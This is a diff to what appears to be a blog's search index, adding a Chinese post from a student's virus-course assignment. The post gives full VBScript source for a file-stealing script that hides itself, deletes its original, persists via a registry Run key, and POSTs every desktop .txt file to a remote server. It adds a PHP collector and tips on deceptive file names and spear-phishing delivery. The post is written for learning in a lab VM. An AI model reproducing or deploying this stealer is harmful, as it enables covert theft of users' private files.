@@ -1,6 +1,86 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>vbs窃密脚本</title>
+    <url>/2020/05/21/vbs%E7%AA%83%E5%AF%86%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="VBS窃密脚本"><a href="#VBS窃密脚本" class="headerlink" title="VBS窃密脚本"></a>VBS窃密脚本</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        计算机病毒老师要让整一个大作业，形式不限，刚好对之前老师讲到的VBS脚本病毒感兴趣，所以自己也想整一个，设计了一个无害的窃密脚本，也算是巩固之前的学习。上个月找了家实习，所以博客最近更新比较慢，马上又要考试，估计后面更新随缘，等这段时间忙过去就好了，主要在公司实习做的主动防御，也就是流量分析和样本分析，这些内容不好写，后面碰到可以写的就发到博客上面来。</p>
+<a id="more"></a>
+
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
+<p>测试环境：虚拟机：WindowsXP SP3  ip：192.168.2.134</p>
+<p>​                  物理机：Windows10 ip：192.168.2.1</p>
+</blockquote>
+<p>先把VBS脚本内容贴出来：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> fso=<span class="built_in">createobject</span>(<span class="string">"scripting.filesystemobject"</span>) <span class="comment">'创建文件系统对象</span></span><br><span class="line"><span class="keyword">if</span> fso.getFile(Wscript.ScriptFullName)=<span class="string">"C:\here.vbs"</span> <span class="keyword">then</span> <span class="comment">'检测是否在指定路径中</span></span><br><span class="line">    scan(<span class="string">"C:\Documents and Settings\Administrator\桌面"</span>)</span><br><span class="line">    <span class="keyword">sub</span> scan(folder_) <span class="comment">'写一个扫描过程</span></span><br><span class="line">        <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line">        <span class="keyword">set</span> folder_=fso.getfolder(folder_)</span><br><span class="line">	<span class="keyword">set</span> files=folder_.files</span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">each</span> file <span class="keyword">in</span> files</span><br><span class="line">            ext=fso.GetExtensionName(file) <span class="comment">'获取文件后缀</span></span><br><span class="line">	    ext=<span class="built_in">lcase</span>(ext) <span class="comment">'后缀名转换成小写字母</span></span><br><span class="line">            <span class="keyword">if</span> ext=<span class="string">"txt"</span> <span class="keyword">then</span>  <span class="comment">'寻找txt文件</span></span><br><span class="line">	        <span class="keyword">set</span> self=fso.opentextfile(file,<span class="number">1</span>)</span><br><span class="line">                information=self.readall <span class="comment">'读取文件内容</span></span><br><span class="line">                <span class="keyword">Set</span> http = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) <span class="comment">'创建HTTP连接对象</span></span><br><span class="line">                http.open <span class="string">"POST"</span>, <span class="string">"http://192.168.2.1/vbstest.php"</span>, <span class="literal">False</span>  <span class="comment">'对http服务器发起post请求</span></span><br><span class="line">                http.setRequestHeader <span class="string">"CONTENT-TYPE"</span>,<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">                http.send <span class="string">"information="</span>&amp;file+<span class="string">" : "</span>&amp;information <span class="comment">'格式化发送内容</span></span><br><span class="line">	    <span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">        <span class="keyword">set</span> subfolders=folder_.subfolders</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">each</span> subfolder <span class="keyword">in</span> subfolders <span class="comment">'搜索其他目录</span></span><br><span class="line">        scan(subfolder)  <span class="comment">'用递归的方式遍历子目录</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">sub</span></span><br><span class="line"><span class="keyword">else</span> <span class="comment">'不在时将其放到指定路经并设置注册表开机自启</span></span><br><span class="line">    <span class="keyword">set</span> self=fso.opentextfile(wscript.scriptfullname,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">set</span> selfpath=fso.getFile(wscript.scriptfullname)</span><br><span class="line">    vbscopy=self.readall</span><br><span class="line">    self.close</span><br><span class="line">    selfpath.delete() <span class="comment">'自删除</span></span><br><span class="line">    <span class="keyword">set</span> ap =fso.opentextfile(<span class="string">"C:\here.vbs"</span>,<span class="number">2</span>,<span class="literal">true</span>)</span><br><span class="line">    ap.write vbscopy</span><br><span class="line">    ap.close</span><br><span class="line">    <span class="keyword">set</span> shell=WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">    shell.regwrite <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\here"</span>,<span class="string">"C:\here.vbs"</span>,<span class="string">"REG_SZ"</span>  <span class="comment">'修改注册表以达到自启动</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本语言配合注释很好理解，代码不多阐述</p>
+<p><strong>代码的主要功能：</strong></p>
+<p>​    脚本文件启动后会将自身复制到c盘根目录下（可以修改到任意目录和文件名称，以增强隐蔽性），同时将复制的文件通过修改注册表，加入到开机自启动项中，实现开机自启，然后自删除。</p>
+<p>​    复制文件随着开机自启会扫描桌面目录及其子目录上的txt文件（可以修改代码使之扫描任何目录和其子目录），并且将文件内容发送到远程的http服务器上，达到窃密的效果。</p>
+<p><strong>脚本效果展示：</strong>(图有点糊，凑合看吧)</p>
+<p>将脚本放到桌面运行：</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqYb9S.png" alt="YqYb9S.png"></p>
+<p>运行here.txt.vbs</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqYLcQ.png" alt="YqYLcQ.png"></p>
+<p>运行后脚本消失</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/Yqt9hT.png" alt="Yqt9hT.png"></p>
+<p>同时在c盘根目录下发现vbs脚本</p>
+<p>下面在物理机中启动http服务器，服务器搭设和脚本无关，在此不描述，在网站根目录写入php文件，用来接受脚本发来的消息，并将消息追加到同目录下information.txt文件下：</p>
+<p>PHP代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is an information collection site that receives private information from a post request sent by a VBS script virus"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"information"</span>]))&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"information.txt"</span>, <span class="string">"a"</span>); <span class="comment">//用于将接收到的消息追加到information.txt中</span></span><br><span class="line">    fwrite($myfile, date(<span class="string">"Y-m-d H:i"</span>,time()).<span class="string">"\n"</span>);</span><br><span class="line">    fwrite($myfile, $_POST[<span class="string">'information'</span>].<span class="string">"\n"</span>);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在虚拟机浏览器连接测试网络连通性：</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqtnN6.png" alt="YqtnN6.png"></p>
+<p>OK 测试无误</p>
+<p>重启测试脚本是否自启动，并且将桌面目录以及其子目录txt文件发送到服务器：</p>
+<p>我在XP桌面目录以及其子目录下新建2个txt文件，如下：</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/Yqt1jH.png" alt="Yqt1jH.png"></p>
+<p>txt文件内容如下：</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqttEt.png" alt="YqttEt.png"></p>
+<p>重启XP：（这熟悉的画面，我的青春回来了）</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqUAT1.png" alt="YqUAT1.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/21/Yqtruj.png" alt="Yqtruj.png"></p>
+<p>重启后XP无任何异常</p>
+<p>在物理机网站根目录下查看information.txt文件：</p>
+<p><img src="https://s1.ax1x.com/2020/05/21/YqNERS.png" alt="YqNERS.png"></p>
+<p>NICE！！！接受到了脚本发来的数据</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结：</p>
+<p>在设计脚本的时候按照病毒的特性去设计的，但是考虑到脚本仅用于实验，所以设计了一个无害的窃密脚本，以下归纳一些此脚本的特性：</p>
+<ol>
+<li>隐蔽性：</li>
+</ol>
+<p>脚本在运行后我复制到一个用户未知的文件夹中，然后自删除，且可以将脚本名称改为例如：“system.ini.vbs”之类迷惑用户，达到隐蔽的目的，且脚本在执行窃密时无任何反应。</p>
+<ol start="2">
+<li>自启动性</li>
+</ol>
+<p>脚本会将复制挪移后的脚本文件加入到注册表中的自启动项中，达到每次的开机自启窃密的目的。</p>
+<ol start="3">
+<li>破坏性</li>
+</ol>
+<p>无</p>
+<ol start="4">
+<li>传染性</li>
+</ol>
+<p>无传染文件的行为</p>
+<ol start="5">
+<li>传播性</li>
+</ol>
+<p>靠黑客社工或者鱼叉攻击吧</p>
+<ol start="6">
+<li>可触发性：</li>
+</ol>
+<p>随着开机启动触发脚本</p>
+<p>此脚本无自我恢复性，清除脚本只需要找到脚本文件删除并将注册表项删除即可。</p>
+<p><strong>注意：这个VBS脚本目前只在XP上可以运行，在Windows10上弄不起来，应该时Windows10的一些安全策略的影响，不过这玩意也是要淘汰的，就当是复古一下吧</strong></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>vbs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SM3密码杂凑算法</title>
     <url>/2020/05/07/SM3%E5%AF%86%E7%A0%81%E6%9D%82%E5%87%91%E7%AE%97%E6%B3%95/</url>
     <content><![CDATA[<h1 id="SM3密码杂凑算法"><a href="#SM3密码杂凑算法" class="headerlink" title="SM3密码杂凑算法"></a>SM3密码杂凑算法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。</p>
